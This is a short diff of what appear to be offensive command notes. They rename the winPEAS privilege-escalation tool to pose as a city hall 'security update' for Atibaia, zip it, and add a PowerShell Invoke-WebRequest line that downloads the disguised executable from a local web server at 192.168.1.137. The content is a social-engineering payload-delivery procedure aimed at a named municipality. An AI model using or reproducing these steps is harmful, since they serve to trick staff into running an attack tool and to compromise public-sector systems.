@@ -28,4 +28,7 @@ sudo systemctl restart apache2
 mv winPEASx64.exe Atualizacao_Seguranca_Prefeitura_2021.exe
 zip -r Pacote_Atualizacao_Completo_Atibaia.zip Atualizacao_Seguranca_Prefeitura_2021.exe
 
+Invoke-WebRequest -Uri "http://192.168.1.137/Atualizacao_Seguranca_Prefeitura_2021.exe" -OutFile "Atualizacao_Seguranca_Prefeitura_2021.exe"
+
+
  
